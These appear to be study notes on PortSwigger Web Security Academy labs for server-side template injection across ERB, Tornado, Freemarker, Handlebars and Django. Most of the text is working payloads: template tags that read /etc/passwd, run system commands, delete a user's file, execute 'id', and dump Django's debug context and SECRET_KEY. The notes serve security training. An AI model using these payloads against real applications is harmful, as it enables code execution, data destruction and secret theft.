# Encounters
https://portswigger.net/research/server-side-template-injection

# Basic SSTI
Delete user's file. 
- Find the SSTI 
```
https://0a0000c703bc23e380d30d40003b00bf.web-security-academy.net/?message=Unfortunately%20this%20product%20is%20out%20of%20stock
```
This is reflected in the page. 
- Tried a few payloads before finding one for ERB;
```
${ 7 * 7}
${{<%[%'"}}%\.
<%= 7*7 %> - works
'<%= File.read("/etc/passwd") %>' - works
```
With the two Ruby ones working we're definitely using ERB. 
```
<%=%20system("ls%20/home/")%20%>
<%=%20system("ls%20/home/carlos")%20%>
<%=%20system("rm%20/home/carlos/morale.txt")%20%>
```

# Basic server-side template injection (code context)
Delete morale.txt
## Observations
- Can post comments to a blog. 
- Can change my username displayed in my comments from /my-account:
```
blog-post-author-display=user.first_name&csrf=Ju0D0cmlYZs0zwlQOf5648sn0ugDlaRZ
```
- Changed the value from user.nickname to user.email_address then tried to submit another comment and get this error - 
```
Internal Server Error
Traceback (most recent call last): File "<string>", line 16, in <module> File "/usr/local/lib/python2.7/dist-packages/tornado/template.py", line 348, in generate return execute() File "<string>.generated.py", line 4, in _tt_execute AttributeError: User instance has no attribute 'email_address'
```
So, that's our injection point. And from the error we can see it is in tornado. 
- Payloads:
```
{{7*7}}
```
Getting execution:
```
blog-post-author-display=user.nickname}}{%25+import+os+%25}{{os.system('rm+/home/carlos/morale.txt')}}&csrf=Ju0D0cmlYZs0zwlQOf5648sn0ugDlaRZ
```

# Server-side template injection using documentation
## Observations
- You can log in and edit templates as admin. 
- Freemarker templates 
```
${"freemarker.template.utility.Execute"?new()("id")}
${7*&}
```

# Server-side template injection in an unknown language with a documented exploit
## Observations
- No real interactivity. 
- Fuzzed productId and it didn't have anything. 
- The first product has an error message because its out of stock and the message gets reflected into the page. 
- Inducing an error reveals handlebars. 


# Information disclosure via user-supplied objects
## Observations
- Can login and edit templates
- Caused an error and found its django. Using payloads all the things - debug shows there is a secret key. 
```
{% debug %}
```
```
{{settings.SECRET_KEY}}
```
